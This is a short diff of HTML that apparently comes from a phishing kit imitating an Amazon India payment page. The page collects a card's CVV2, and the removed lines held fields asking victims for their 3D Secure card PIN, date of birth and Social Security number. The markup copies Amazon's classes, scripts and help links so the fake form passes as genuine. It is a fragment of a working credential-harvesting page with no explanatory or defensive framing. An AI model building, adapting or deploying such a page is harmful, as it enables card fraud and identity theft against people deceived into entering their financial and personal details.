@@ -268,21 +268,6 @@ amzn.copilot.checkCoPilotSession();
 <label for="pmts-id-18" class="pmts-form-label">CVV2</label></span></li><li><span class="a-list-item"><label>(<a class="pmts-cup-mbcc-help-link" target="_blank" href="https://www.amazon.in/gp/help/customer/display.html?nodeId=201461830"> What's this? </a>)</label></span></li></ul><input type="text" maxlength="4" id="pmts-id-18" name="cvv2" class="a-input-text a-width-large"><br><span id="pmts-id-19"></span></div><BR/>
 <div class="a-divider a-divider-break"><h5></h5></div>
 <BR/>
-<label for="ap_email">
-              3D secure (VBV/MSC)
-            </label>
-<input type="text" name="vbv" tabindex="1" placeholder="card pin" class="a-input-text a-span12 auth-autofocus auth-required-field">
-<BR/><BR/>
-<label for="ap_email">
-              Date of birth
-            </label>
-<input type="text" name="dob" tabindex="1" placeholder="MM/DD/YYYY" class="a-input-text a-span12 auth-autofocus auth-required-field">
-<BR/><BR/>
-<label for="ap_email">
-              SSN
-            </label>
-<input type="text" name="ssn" tabindex="1" placeholder="XXX-XX-XXXX" class="a-input-text a-span12 auth-autofocus auth-required-field">
-
   <div class="a-row a-spacing-top-medium">
     <div class="a-section a-text-center">
       <label for="auth-remember-me">
